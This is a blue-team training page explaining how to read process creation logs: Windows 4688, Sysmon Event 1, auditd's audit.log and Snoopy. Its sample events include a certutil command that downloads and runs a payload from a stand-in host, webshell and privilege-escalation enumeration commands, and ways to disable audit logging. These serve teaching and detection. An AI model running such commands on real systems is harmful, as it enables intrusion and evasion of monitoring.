---
title: "Process Creation Events — 4688, Sysmon Event 1, auditd and audit.log, Snoopy"
tags:
  - training
  - blue-team
  - windows
  - linux
  - logging
  - sysmon
  - auditd
---

# Process Creation Events — 4688, Sysmon Event 1, auditd and audit.log, Snoopy { #process-creation }

!!! abstract "What this page covers"
    The single most valuable endpoint log: a record every time a program starts. Why process creation logs catch almost every piece of malware and almost every "living off the land" trick, and which fields make them useful — **path**, **command line**, **parent process**, **user**, **hash** and **signer**. On Windows: event **4688** in the Security channel (how to turn it on, why the command line is *off* by default, every field of a real event) and **Sysmon Event ID 1** (the extra fields it gives you, including hashes and the parent's command line, and what it does *not* give you). On Linux: the audit subsystem **auditd** — a process-creation rule read word by word, a full `audit.log` record split into its SYSCALL/EXECVE/CWD/PATH/PROCTITLE lines and read field by field, hex-encoded arguments, `auid` as the "real human behind `sudo`", and the `ausearch`/`aureport` tools — then **Snoopy**, a lighter command logger that writes one readable line per command into the auth log, and the ways each tool can be bypassed. A SOC checklist, the 2026 view and practice questions.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs, hashes and file names are invented for illustration (`.example`, documentation and private IPs).

## The 8 key points { #key-points }

1. A process creation log answers "**what ran, who ran it, how, and what started it**". Almost every attack has to run *something*, so this log sees nearly every intrusion — including ones that use only built-in Windows or Linux tools.
2. The **command line** is the most important field. `powershell.exe` is normal; `powershell.exe -nop -w hidden -enc JABjAD0A...` started by Word is not. Without arguments you cannot tell good use of a tool from bad use.
3. The **parent process** is the second most important field. Office, a browser, a PDF reader or a web server starting a shell (`cmd.exe`, `powershell.exe`, `/bin/sh`) is one of the strongest signals you have.
4. Windows **4688** (Security channel) is built in and needs no agent, but the **command line is not recorded until you enable a separate policy setting**. Check that it is on everywhere.
5. **Sysmon Event ID 1** (`Microsoft-Windows-Sysmon/Operational`) adds file hashes, version information (description, product, company, original file name), the **parent's command line**, a unique `ProcessGuid` and the integrity level. With hashes in the log you can start checking reputation without touching the endpoint.
6. **[Correction]** Sysmon Event 1 does **not** contain the file's signature status — that appears in other Sysmon events (image and driver loads) and in EDR telemetry. Version-info fields are copied from the file and are easy for an attacker to fake.
7. On Linux, **auditd** with an `execve` rule records every program start, but one command becomes **several lines** joined by a shared serial number, arguments may be **hex-encoded**, and the field `auid` keeps the **original login user** even after `sudo` or `su`.
8. **Snoopy** writes one easy-to-read line per command to syslog (usually `/var/log/auth.log`), but it works by preloading a library, so statically-built programs and a root attacker can avoid it. Imperfect does not mean useless — collect it, and know its limits.

## Why process creation logs matter so much { #why }

Imagine a hospital where every medicine leaving the pharmacy is written in a ledger: which drug, which dose and instructions, which doctor ordered it, for which patient, and which nurse picked it up. You would not need to watch every room to spot trouble. A ledger entry like "morphine, ten times the normal dose, ordered by the cleaning staff" jumps out on its own. Process creation logs are that ledger for a computer. The "drug" is the program (the **image** or executable path), the "dose and instructions" are the **command-line arguments**, the "doctor who ordered it" is the **parent process**, and the "patient" is the **user account** the program runs as.

Back to the technical reality. Every time the operating system creates a new process, it knows exactly which file was loaded, what arguments were passed, which process asked for it and under which security token it runs. A process creation log simply writes that down. This matters for three reasons.

First, **almost all malware has to execute**. Even malware that lives mostly in memory usually starts from some process: a script host, a shell, a signed binary abused to run code. Whatever it is, its launch appears here.

Second, attackers increasingly avoid bringing their own tools and instead use what is already installed — "living off the land". `certutil.exe` downloads a file, `rundll32.exe` runs a DLL, `mshta.exe` runs a script, `wmic.exe` starts a process remotely, `bash` pipes a download straight into a shell. The *program* in each case is legitimate and signed; only the **arguments** and the **parent** reveal the abuse. ATT&CK groups much of this under **T1059** (Command and Scripting Interpreter: `.001` PowerShell, `.003` Windows Command Shell, `.004` Unix Shell) and **T1218** (System Binary Proxy Execution).

Third, in bulk these logs act like a **lightweight application control in watch-only mode**. If you have collected process starts across the whole fleet, you can ask "which executables have run on only one machine, ever?" or "which hashes have never been seen before this week?". A brand-new program appearing in `C:\Users\<user>\AppData\Local\Temp\` on one laptop stands out against millions of ordinary entries. Many application-control bypasses (see [Application control, FIM and catching persistence](../endpoint-defense/appcontrol-fim-persistence.md)) use trusted programs with odd scripts or arguments — exactly what this log records.

### What a good process creation log contains { #ideal-fields }

| Field | Why you want it |
| --- | --- |
| Time and host | Where and when — the basis of every timeline |
| Executable path and name | `C:\Windows\System32\cmd.exe` vs `C:\ProgramData\cmd.exe` — same name, very different meaning |
| Command line (arguments) | Separates good from bad use of the same program |
| Parent process (path, ID, ideally its command line) | "Who started this?" — the strongest context field |
| User and logon/session ID | Who it ran as, and which logon it belongs to (links to [login events](logins.md)) |
| Process ID (and a unique ID) | Lets you join it with network, file and registry events from the same process |
| Hash | Reputation lookups, fleet-wide "first seen" and prevalence |
| Signature / signer | Unsigned binaries in unusual places deserve a look (but signed ≠ safe) |
| Integrity level / elevation | Did it run with full admin rights? |

No single source gives you all of these. The table below shows the common sources; this page goes through the four that every analyst meets.

| Platform | Source | Notes |
| --- | --- | --- |
| Windows | Security event **4688** | Built in; command line needs an extra setting; no hashes |
| Windows | **Sysmon** Event 1 | Free Microsoft tool (and in 2026 also a built-in optional Windows feature); hashes, parent command line, GUIDs |
| Windows / Linux / macOS | EDR agent | Usually the richest source; viewed in the EDR console or streamed to the SIEM |
| Linux | **auditd** `execve` rules | Built into the kernel audit system; very detailed, very verbose |
| Linux | **Snoopy** | Preloaded library; one line per command into syslog |
| Linux | eBPF-based sensors (e.g. Sysmon for Linux, Falco, Tetragon), Auditbeat, Sysdig | Modern alternatives with structured output |

## Windows event 4688: a new process has been created { #4688 }

### What it is and when it fires { #4688-when }

Event **4688 — "A new process has been created"** is written to the **Security** channel every time a process starts, provided the audit subcategory **Audit Process Creation** (under *Detailed Tracking* in Advanced Audit Policy) is enabled for **Success**. Its companion **4689 — "A process has exited"** records the end of a process (subcategory *Audit Process Termination*); it is useful for working out how long something ran, but far less important.

The big advantage of 4688 is that it needs nothing extra. Every supported Windows version has it, and most organisations already ship the Security channel to their SIEM, so turning it on often "just works". The big trap is that **the command line is not included by default**. You must also enable the Group Policy setting *Administrative Templates → System → Audit Process Creation → **Include command line in process creation events*** (registry value `ProcessCreationIncludeCmdLine_Enabled` = 1 under `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit`). Without it, the `CommandLine` field is empty and you lose most of the value.

Attackers care about 4688 because it records **Execution** (TA0002) in plain text: the download cradle, the encoded PowerShell, the `whoami /all` and `net group "domain admins" /domain` of **Discovery** (T1033, T1069.002), the `vssadmin delete shadows` before ransomware (T1490). It is also why some attackers try to clear the Security log (T1070.001, event 1102) or tamper with audit policy (T1562.002).

### A complete event { #4688-sample }

A user on workstation `WS-114` opens a document from an email. A moment later Word starts a command shell, which uses `certutil.exe` to download a file. Here is the 4688 for the `certutil.exe` process (System section shortened):

```xml
<System>
  <EventID>4688</EventID>
  <TimeCreated SystemTime="2026-11-20T02:14:07.5521846Z" />
  <Channel>Security</Channel>
  <Computer>WS-114.corp.example</Computer>
</System>
<EventData>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-3108</Data>
  <Data Name="SubjectUserName">j.park</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x2b04e11</Data>
  <Data Name="NewProcessId">0x1f3c</Data>
  <Data Name="NewProcessName">C:\Windows\System32\certutil.exe</Data>
  <Data Name="TokenElevationType">%%1938</Data>
  <Data Name="ProcessId">0x1e88</Data>
  <Data Name="CommandLine">certutil.exe -urlcache -split -f http://files.example/inv.txt C:\Users\Public\inv.exe</Data>
  <Data Name="TargetUserSid">S-1-0-0</Data>
  <Data Name="TargetUserName">-</Data>
  <Data Name="TargetDomainName">-</Data>
  <Data Name="TargetLogonId">0x0</Data>
  <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
  <Data Name="MandatoryLabel">S-1-16-8192</Data>
</EventData>
```

### Field by field { #4688-fields }

- `SubjectUserSid` / `SubjectUserName` / `SubjectDomainName` — the account the new process runs as: `CORP\j.park`, a normal domain user.
- `SubjectLogonId` — `0x2b04e11`, the logon session this process belongs to. Search the same value in 4624 on `WS-114` to find *how* this user logged on (console, RDP, network) — see [The Logon ID](logins.md#logon-id).
- `NewProcessId` — the new process's ID in hex (`0x1f3c` = 7996). Process IDs are reused, so always pair them with the host and time.
- `NewProcessName` — the full path of the executable. `certutil.exe` in `System32` is the genuine Windows certificate tool; the same name in `C:\Users\Public\` would be a fake.
- `TokenElevationType` — the UAC token type. `%%1936` = Type 1 (full token: UAC is off, the built-in Administrator, or a service), `%%1937` = Type 2 (**elevated** — "Run as administrator" was accepted), `%%1938` = Type 3 (**limited**, the normal non-elevated token). Here it is limited, so the attacker does not yet have admin rights on this session.
- `ProcessId` — **the parent's** process ID (`0x1e88`). The name is confusing: in 4688, `ProcessId` is the *creator*, not the new process.
- `CommandLine` — the whole story: `-urlcache -split -f` makes `certutil` fetch a URL and save it to a file, here a "text" file saved as `inv.exe` in a world-writable folder. This is **Ingress Tool Transfer** (T1105) through a signed Windows binary.
- `TargetUserSid` / `TargetUserName` / `TargetLogonId` — filled only when the new process runs as a *different* account from its creator (for example `runas`). `S-1-0-0`/`-`/`0x0` means "same account as the subject".
- `ParentProcessName` — the creator's path: `cmd.exe`. Note that 4688 gives you the parent's **name but not its command line**. To see what started `cmd.exe` you need the previous 4688 — the one whose `NewProcessId` equals `0x1e88`.
- `MandatoryLabel` — the integrity level SID: `S-1-16-4096` low, `S-1-16-8192` **medium** (normal user), `S-1-16-12288` high (elevated admin), `S-1-16-16384` system.

Following the chain back, the previous 4688 on the same host would show `NewProcessId` `0x1e88`, `NewProcessName` `C:\Windows\System32\cmd.exe`, `CommandLine` `cmd.exe /c certutil.exe -urlcache ... && C:\Users\Public\inv.exe` and `ParentProcessName` `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`. **Word → cmd → certutil** is the shape of a malicious document (T1204.002, User Execution: Malicious File).

### Finding these events with PowerShell { #4688-query }

On a single host, or on an exported `.evtx` file, you can pull 4688s with `Get-WinEvent`:

```powershell
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4688; StartTime = (Get-Date).AddHours(-2) } |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    $d = @{}; $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    [pscustomobject]@{ Time = $_.TimeCreated; Parent = $d.ParentProcessName; New = $d.NewProcessName; Cmd = $d.CommandLine }
  } |
  Where-Object { $_.Parent -match '\\(winword|excel|powerpnt|outlook)\.exe$' }
```

- Line 1 — `Get-WinEvent` reads events; `-FilterHashtable` filters inside the event log service (fast): the `Security` log, ID `4688`, only the last two hours.
- Line 2 — `ForEach-Object` handles each event in turn.
- Line 3 — converts the event to XML so we can read named fields instead of the message text.
- Line 4 — builds a small dictionary `$d` mapping each `Data Name` (e.g. `CommandLine`) to its value.
- Line 5 — outputs a tidy object with just the time, parent, new process and command line.
- Line 7 — keeps only processes whose parent is an Office program.

Typical output:

```text
Time                 Parent                                                   New                                 Cmd
----                 ------                                                   ---                                 ---
20/11/2026 1:14:06 PM C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE C:\Windows\System32\cmd.exe cmd.exe /c certutil.exe -urlcache -split -f http://files.example/inv.txt ...
```

(The time shows in the analyst's local time zone — here 13:14 local for 02:14 UTC.) In a SIEM you would write the same logic as a search over the normalised fields `parent_process`, `process` and `command_line`.

## Sysmon Event ID 1: process creation, with more detail { #sysmon-1 }

### What Sysmon is { #sysmon-what }

**Sysmon (System Monitor)** is a free Microsoft tool made of a driver and a service. Once installed with a configuration file, it writes detailed events into its own channel, **`Microsoft-Windows-Sysmon/Operational`**. **Event ID 1** is process creation; other IDs cover network connections (3), image loads (7), process access such as reading LSASS memory (10), file creation (11), registry changes (12–14), DNS queries (22) and more. It costs more effort than 4688 — you must deploy the binary, maintain an XML configuration that decides what to record and what to drop, and collect an extra channel — but it gives far richer data, and one deployment covers many event types.

### A complete event { #sysmon-1-sample }

The same `certutil.exe` launch, as Sysmon records it:

```xml
<System>
  <Provider Name="Microsoft-Windows-Sysmon" />
  <EventID>1</EventID>
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
  <Computer>WS-114.corp.example</Computer>
</System>
<EventData>
  <Data Name="RuleName">technique_id=T1105,technique_name=Ingress Tool Transfer</Data>
  <Data Name="UtcTime">2026-11-20 02:14:07.552</Data>
  <Data Name="ProcessGuid">{6b1d2c4e-8a3f-673d-2c05-000000002f00}</Data>
  <Data Name="ProcessId">7996</Data>
  <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
  <Data Name="FileVersion">10.0.26100.1 (WinBuild.160101.0800)</Data>
  <Data Name="Description">CertUtil.exe</Data>
  <Data Name="Product">Microsoft® Windows® Operating System</Data>
  <Data Name="Company">Microsoft Corporation</Data>
  <Data Name="OriginalFileName">CertUtil.exe</Data>
  <Data Name="CommandLine">certutil.exe -urlcache -split -f http://files.example/inv.txt C:\Users\Public\inv.exe</Data>
  <Data Name="CurrentDirectory">C:\Users\j.park\Documents\</Data>
  <Data Name="User">CORP\j.park</Data>
  <Data Name="LogonGuid">{6b1d2c4e-7f10-673d-114e-b00200000000}</Data>
  <Data Name="LogonId">0x2b04e11</Data>
  <Data Name="TerminalSessionId">1</Data>
  <Data Name="IntegrityLevel">Medium</Data>
  <Data Name="Hashes">SHA256=3F9A0C7E5B21D4486E0A9C1F7B3D52E8A6C04F91D7B2E35A8C6F0D1B4E7A9C23,IMPHASH=0D4A8E2C7F1B93A65E0C2D8F4B1A7E36</Data>
  <Data Name="ParentProcessGuid">{6b1d2c4e-8a3e-673d-2b05-000000002f00}</Data>
  <Data Name="ParentProcessId">7816</Data>
  <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
  <Data Name="ParentCommandLine">cmd.exe /c certutil.exe -urlcache -split -f http://files.example/inv.txt C:\Users\Public\inv.exe &amp;&amp; C:\Users\Public\inv.exe</Data>
  <Data Name="ParentUser">CORP\j.park</Data>
</EventData>
```

### What Sysmon adds, field by field { #sysmon-1-fields }

The core is the same as 4688 — `Image` (new process path), `CommandLine`, `User`, `LogonId`, `ParentImage`. The extras are where the value is:

- `RuleName` — the label from the Sysmon configuration rule that matched. Community configurations tag rules with ATT&CK IDs, so the event arrives already hinting at what it might be.
- `UtcTime` — always UTC, which makes cross-host timelines easier.
- `ProcessGuid` / `ParentProcessGuid` — a **unique ID for this process** that, unlike a PID, is never reused. Every other Sysmon event from this process (its network connections, files written, registry changes) carries the same GUID, so you can join them reliably.
- `FileVersion`, `Description`, `Product`, `Company`, `OriginalFileName` — version information read from the PE file. `OriginalFileName` is especially useful: if someone copies `certutil.exe` to `C:\ProgramData\update.exe` to dodge name-based rules, `Image` changes but `OriginalFileName` still says `CertUtil.exe` (detecting T1036.003, Rename System Utilities). **[Caution]** Attackers can write any text they like into the version information of their *own* malware; treat these as hints, not proof.
- `CurrentDirectory` — where the process was started from. A shell whose working directory is a web root or a temp folder is a clue.
- `IntegrityLevel` — `Low`, `Medium`, `High` or `System`, in plain words.
- `Hashes` — the hashes you chose in the configuration (`MD5`, `SHA1`, `SHA256`, `IMPHASH`). This is the big win: as soon as the event reaches the SIEM you can check the hash against threat intelligence and against your own fleet ("how many machines have ever run this?") without logging on to the endpoint or copying the file. `IMPHASH` (a hash of the imported functions) helps cluster variants of the same malware family.
- `ParentCommandLine` — the parent's full command line, so one event shows two generations: `cmd.exe /c ... && C:\Users\Public\inv.exe`. Here we can see the attacker meant to *run* the downloaded file straight away.
- `ParentUser` — the account the parent ran as (added in newer Sysmon versions). A parent running as `SYSTEM` starting a child as a normal user, or the reverse, is worth noting.

**[Correction]** Sysmon Event 1 does **not** tell you whether the executable is signed. Signature details (`Signed`, `Signature`, `SignatureStatus`) appear in Sysmon **Event 6** (driver loaded) and **Event 7** (image loaded), and most EDRs record signer information for every process. If you need the signer of a process image from Sysmon, look at the Event 7 for that `ProcessGuid` loading its own image, or check the file with a signature tool.

### 4688 or Sysmon? { #4688-vs-sysmon }

| | 4688 | Sysmon Event 1 |
| --- | --- | --- |
| Install needed | No (policy only) | Driver + service + config (or the 2026 built-in optional feature) |
| Command line | Only with the extra policy | Always |
| Parent | Name and PID only | Path, PID, GUID, **command line**, user |
| Hashes | No | Yes (configurable) |
| Version info | No | Yes (`OriginalFileName` etc.) |
| Unique process ID | No (PIDs are reused) | `ProcessGuid` |
| Other event types | Other Security events | Network, file, registry, DNS, process access… |
| Volume control | All-or-nothing | Include/exclude rules in the config |

If you can deploy it, Sysmon is the better choice for detail, and many teams run **both** — 4688 as a safety net that does not depend on an extra agent. Sysmon records much of what an EDR records, so it is sometimes called a "poor man's EDR", but it cannot **respond**: it will not isolate a host, kill a process or pull a file. If you already have an EDR, its process telemetry (for example Microsoft Defender for Endpoint's `DeviceProcessEvents`) often makes Sysmon optional; see [PAWs, EDR, DLP and UEBA](../endpoint-defense/paw-edr-dlp-ueba.md).

## Linux process creation with auditd { #auditd }

### What auditd is { #auditd-what }

Linux has a built-in **audit subsystem** in the kernel, with a user-space daemon **`auditd`** that writes its records to **`/var/log/audit/audit.log`**. It can watch almost anything: reads and writes to particular files, any system call, program execution, logins, changes to user accounts, network-related calls — and it records which user did each. It does **not block** anything; it only records. Rules are added with **`auditctl`** (immediately, but lost at reboot) or written to files in **`/etc/audit/rules.d/`** (loaded at boot by `augenrules`). Records are searched with **`ausearch`** and summarised with **`aureport`**.

A good analogy is a court stenographer: auditd writes down every word, in a fixed, very formal shorthand. Nothing is missed, but reading the transcript takes practice.

### A rule for process creation, word by word { #auditd-rule }

On Linux a new program is started by the **`execve`** system call (a process first copies itself with `fork`/`clone`, then the copy calls `execve` to become the new program). So "log every process creation" means "log every `execve`":

```bash
sudo auditctl -a always,exit -F arch=b64 -S execve -k proc_create
sudo auditctl -a always,exit -F arch=b32 -S execve -k proc_create
```

- `auditctl` — the tool that changes the kernel's audit rules.
- `-a always,exit` — **append** a rule to the `exit` list (check when a system call *returns*, so the result is known) with action `always` (always write a record).
- `-F arch=b64` — a **field** filter: only the 64-bit system call table. System call numbers differ between 32-bit and 64-bit, so you need a second rule with `arch=b32` — otherwise an attacker can run a 32-bit program and avoid the 64-bit rule.
- `-S execve` — the system call to watch. **[Supplement]** Newer rule sets also add `-S execveat`, a variant that starts a program from an open file handle.
- `-k proc_create` — a **key**, a free-text tag stored in each record so you can search for this rule's records later (`ausearch -k proc_create`).

To keep the rule after a reboot, put the same lines (without `sudo auditctl`) in a file such as `/etc/audit/rules.d/50-exec.rules` and run `sudo augenrules --load`. `sudo auditctl -l` lists the rules that are active right now.

### One command, six lines: reading audit.log { #auditd-record }

With the rule above active, a user on server `app-02` types `whoami` while in `/var/log`. auditd writes:

```text
type=SYSCALL msg=audit(1795140847.866:8332): arch=c000003e syscall=59 success=yes exit=0 a0=55c8f62466e0 a1=55c8f61beaf0 a2=55c8f6225430 a3=4040 items=2 ppid=54636 pid=54831 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=2 comm="whoami" exe="/usr/bin/whoami" key="proc_create"
type=EXECVE msg=audit(1795140847.866:8332): argc=1 a0="whoami"
type=CWD msg=audit(1795140847.866:8332): cwd="/var/log"
type=PATH msg=audit(1795140847.866:8332): item=0 name="/usr/bin/whoami" inode=1049945 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
type=PATH msg=audit(1795140847.866:8332): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=1447302 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
type=PROCTITLE msg=audit(1795140847.866:8332): proctitle="whoami"
```

The first thing to see is that **all six lines belong to one event**. They are tied together by `msg=audit(1795140847.866:8332)`: the part before the colon is the time in Unix epoch seconds with milliseconds (1795140847.866 = 20 Nov 2026 02:14:07.866 UTC) and `8332` is the **event serial number**. Lines with the same timestamp and serial are one event; a SIEM must join them, or you will see six half-events.

**The SYSCALL line — who did what:**

- `type=SYSCALL` — the record of the system call itself.
- `arch=c000003e` — the CPU architecture in audit's code: `c000003e` = x86_64.
- `syscall=59` — system call number 59, which is `execve` on x86_64 (`ausearch -i` prints the name for you).
- `success=yes exit=0` — the call worked. A failed `execve` (`success=no exit=-13`, permission denied) can also be interesting: someone tried to run something they were not allowed to.
- `a0`–`a3` — the first four raw arguments to the system call, as memory addresses. Not useful to analysts; the real arguments are in the EXECVE line.
- `items=2` — how many PATH lines follow.
- `ppid=54636 pid=54831` — parent process ID and the new process ID. Search `pid=54636` to find the parent (usually the user's shell).
- `auid=1000` — the **audit user ID**, also called the *login UID*. It is set when a user logs in and **does not change** when they use `sudo` or `su`. This is one of the most valuable fields in Linux forensics: if you see `uid=0` (root) with `auid=1000`, a human who logged in as user 1000 became root. If `auid=4294967295` (shown as `unset`), the process was started by something that never logged in — a daemon, a web server, cron — which is very suspicious for an interactive tool like `whoami`.
- `uid gid euid suid fsuid egid sgid fsgid` — the real, effective, saved and filesystem user/group IDs. Usually equal; a difference (e.g. `uid=1000 euid=0`) means a setuid program raised privileges.
- `tty=pts0` — a pseudo-terminal, i.e. an interactive session such as SSH. `(none)` means no terminal (daemons, cron, webshells).
- `ses=2` — the login session number, linking all commands in one login.
- `comm="whoami"` — the short command name (first 15 characters); `exe="/usr/bin/whoami"` — the full path of the executable.
- `key="proc_create"` — the tag from our rule.

**The EXECVE line — the command line:** `argc=1` (one argument, including the program name) and `a0="whoami"`. A command like `ls -la /tmp` would give `argc=3 a0="ls" a1="-la" a2="/tmp"`.

**The CWD line:** `cwd="/var/log"` — the working directory, like Sysmon's `CurrentDirectory`.

**The PATH lines — the files involved:** `item=0` is the program itself, with its inode, device, permissions (`mode=0100755` = regular file, `rwxr-xr-x`) and owner (`ouid=0` = root). `item=1` is the dynamic loader `ld-linux-x86-64.so.2`, which the kernel loads to start any dynamically linked program. The `cap_*` fields show file capabilities (none here).

**The PROCTITLE line:** the full command line as the process sees it. Short and simple here; for anything with spaces it is hex-encoded (next section).

### Hex-encoded arguments { #auditd-hex }

auditd writes a value in quotes only if it contains no spaces, quotes or control characters. Otherwise it writes it as **hex without quotes**. A webshell on `web-01` running `bash -c "id; uname -a"` as the web server user produces, among others:

```text
type=SYSCALL msg=audit(1795141205.104:9120): arch=c000003e syscall=59 success=yes exit=0 ... ppid=2211 pid=30417 auid=4294967295 uid=33 gid=33 euid=33 ... tty=(none) ses=4294967295 comm="bash" exe="/usr/bin/bash" key="proc_create"
type=EXECVE msg=audit(1795141205.104:9120): argc=3 a0="bash" a1="-c" a2=69643B20756E616D65202D61
type=PROCTITLE msg=audit(1795141205.104:9120): proctitle=62617368002D630069643B20756E616D65202D61
```

- `a2=69643B20756E616D65202D61` — no quotes, so it is hex. Decoded: `id; uname -a`.
- `proctitle=62617368002D63...` — hex of the full command line with **null bytes (`00`) between arguments**: `bash`, `-c`, `id; uname -a`.
- `auid=4294967295`, `ses=4294967295`, `tty=(none)`, `uid=33` — no human login, no terminal, running as `www-data`. A web server process spawning `bash` that runs discovery commands (T1033, T1082) is the classic webshell signature (T1505.003).

Decode on the command line with `echo 69643B20756E616D65202D61 | xxd -r -p` (prints `id; uname -a`), or simply let `ausearch -i` do it.

**[Caution]** If your SIEM searches for the text `uname` in `audit.log`, it will **miss** this event, because the word only exists in hex. Decode at ingest (or use a tool that does) before writing detections.

### Searching and reporting: ausearch and aureport { #ausearch }

```bash
sudo ausearch -k proc_create -ts today -i
```

- `ausearch` — searches the audit logs and groups the lines of each event together.
- `-k proc_create` — only events created by rules with this key.
- `-ts today` — time start: since midnight (`-ts recent` = last 10 minutes; you can also give a date and time).
- `-i` — **interpret**: turn numbers into names (syscall 59 → `execve`, uid 1000 → `dev.lee`, hex → text, epoch → local time).

Output (one event, separated by `----`):

```text
----
type=PROCTITLE msg=audit(20/11/26 13:14:07.866:8332) : proctitle=whoami
type=PATH msg=audit(20/11/26 13:14:07.866:8332) : item=0 name=/usr/bin/whoami inode=1049945 dev=08:01 mode=file,755 ouid=root ogid=root ...
type=CWD msg=audit(20/11/26 13:14:07.866:8332) : cwd=/var/log
type=EXECVE msg=audit(20/11/26 13:14:07.866:8332) : argc=1 a0=whoami
type=SYSCALL msg=audit(20/11/26 13:14:07.866:8332) : arch=x86_64 syscall=execve success=yes exit=0 ... ppid=54636 pid=54831 auid=dev.lee uid=dev.lee ... tty=pts0 ses=2 comm=whoami exe=/usr/bin/whoami key=proc_create
```

Other useful queries: `ausearch -ua 1000 -i` (everything done by login user 1000, whatever they became), `ausearch -x /usr/bin/curl -i` (every run of `curl`), `ausearch -p 54636 -i` (the parent). For overviews, `aureport -x --summary` counts executions per program, and `aureport -au` lists authentication attempts:

```text
Executable Summary Report
=================================
total  file
=================================
4127  /usr/bin/bash
2210  /usr/bin/ls
  43  /usr/bin/curl
   1  /tmp/.cache/kworker
```

A program that ran once from `/tmp` under a name that imitates a kernel thread (T1036.004, Masquerade Task or Service) stands out instantly.

### auditd in practice { #auditd-practice }

auditd is thorough almost to a fault. A busy server can produce millions of `execve` records a day, and the multi-line format is awkward for SIEMs. Practical tips:

- Start from a well-known community rule set (several are maintained publicly; the "best practice" audit rules widely used as a baseline are a good start) and tune it, rather than writing everything yourself.
- Exclude known noisy, harmless automation with filters (for example by `exe` or `auid`), and give every rule a meaningful key.
- Forward with a shipper that **joins and decodes** the lines — Auditbeat/Elastic Agent, the Splunk add-on for Linux, or a plugin such as LAUREL that turns each event into a single JSON line.
- Protect the audit system itself: watch for `auditctl -D` (delete all rules), `systemctl stop auditd` and edits under `/etc/audit/` (T1562.012, Disable or Modify Linux Audit System). Adding `-e 2` as the last rule makes the configuration **immutable** until reboot.

## Linux process creation with Snoopy { #snoopy }

### What Snoopy is { #snoopy-what }

**Snoopy** is a small library that logs every command run on the system. Installation is one package (`sudo apt install snoopy` on Debian/Ubuntu); the package adds the library to **`/etc/ld.so.preload`**, so the dynamic loader loads it into every new dynamically linked program. Each time a program calls `execve`, Snoopy writes one line to syslog with the authpriv facility — on Ubuntu that lands in **`/var/log/auth.log`**, on Red Hat-family systems in `/var/log/secure` — where you are probably already collecting logs for login monitoring (see [Linux log files and the journal](../linux-logging/log-files-journal.md)).

If auditd is the court stenographer, Snoopy is the shop's CCTV with a timestamp overlay: lower detail, but anyone can understand the picture at a glance.

### A Snoopy line, field by field { #snoopy-line }

The message format is configurable in `/etc/snoopy.ini` (`message_format`). With a format that includes login and SSH details, a session on `app-02` looks like this:

```text
Nov 20 13:05:33 app-02 snoopy[4550]: [login:dev.lee ssh:(203.0.113.45 53123 10.0.0.12 22) sid:3907 tty:/dev/pts/1 (1000/dev.lee) uid:dev.lee(1000)/dev.lee(1000) cwd:/tmp]: git clone https://git.example/tools/sys-enum.git
Nov 20 13:05:41 app-02 snoopy[4562]: [login:dev.lee ssh:(203.0.113.45 53123 10.0.0.12 22) sid:3907 tty:/dev/pts/1 (1000/dev.lee) uid:dev.lee(1000)/dev.lee(1000) cwd:/tmp/sys-enum]: bash ./sys-enum.sh
Nov 20 13:05:41 app-02 snoopy[4570]: [login:dev.lee ssh:(203.0.113.45 53123 10.0.0.12 22) sid:3907 tty:/dev/pts/1 (1000/dev.lee) uid:dev.lee(1000)/dev.lee(1000) cwd:/tmp/sys-enum]: find / -perm -4000 -type f
Nov 20 13:05:42 app-02 snoopy[4571]: [login:dev.lee ssh:(203.0.113.45 53123 10.0.0.12 22) sid:3907 tty:/dev/pts/1 (1000/dev.lee) uid:dev.lee(1000)/dev.lee(1000) cwd:/tmp/sys-enum]: cat /etc/sudoers
```

- `Nov 20 13:05:33 app-02` — the usual syslog time stamp and host name.
- `snoopy[4550]` — the program tag; the number is the PID of the process that was started.
- `login:dev.lee` — the user who **logged in** (like auditd's `auid`).
- `ssh:(203.0.113.45 53123 10.0.0.12 22)` — taken from the `SSH_CONNECTION` variable: client IP, client port, server IP, server port. So the session came from an external address.
- `sid:3907` — the session ID, to group commands from one login.
- `tty:/dev/pts/1 (1000/dev.lee)` — the terminal and its owner.
- `uid:dev.lee(1000)/dev.lee(1000)` — real and effective user. After `sudo` this would show `root(0)`.
- `cwd:/tmp` — the working directory.
- After the colon — **the full command line**: `git clone https://git.example/tools/sys-enum.git`.

Reading the four lines as a story: a user connected from outside cloned a repository into `/tmp`, ran its script, and that script started searching for setuid binaries and reading the sudoers file. That is a public **privilege-escalation enumeration script** at work (Discovery, T1082 / T1083, preparing Privilege Escalation, TA0004 — see [Privilege escalation](../endpoint-attacks/privilege-escalation.md)). Because the script's own child commands are also logged, the whole enumeration appears line by line — an easy catch if anyone is watching.

### Snoopy's limits { #snoopy-limits }

Snoopy's own authors say it is not a security tool that cannot be avoided. Because it relies on the dynamic loader:

- **Statically linked programs** do not use the loader, so Snoopy is never loaded into them and their own child processes are not logged.
- A program can call the system call directly, or an attacker with root can **remove the line from `/etc/ld.so.preload`** or delete the library (watch that file with FIM or auditd — the preload file is also abused by attackers themselves, T1574.006 Dynamic Linker Hijacking).
- Lines go through syslog, so a root attacker can stop or edit local logging — forward them off the host quickly.
- Commands with secrets in their arguments (`mysql -p<password>`) are logged in clear text; restrict access to the logs.

Remember the **perfect-solution fallacy**: a control that can be bypassed is still valuable if it catches the many attackers who do not bother. Snoopy is cheap and readable; for high-value servers, pair it with auditd or an EDR/eBPF sensor.

## Windows and Linux side by side { #comparison }

